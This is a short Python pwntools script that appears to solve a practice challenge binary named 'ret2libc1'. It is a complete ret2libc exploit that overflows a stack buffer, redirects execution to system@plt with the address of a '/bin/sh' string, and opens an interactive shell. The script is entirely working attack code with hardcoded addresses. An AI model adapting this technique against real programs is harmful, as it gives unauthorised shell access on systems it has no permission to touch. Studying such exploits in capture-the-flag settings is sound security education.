from pwn import *

sh = process('./ret2libc1')

binsh_addr = 0x8048720
system_plt = 0x08048460
payload = flat([b'A' * (0x6C + 0x4), system_plt, b'A' * 4, binsh_addr])
sh.sendline(payload)

sh.interactive()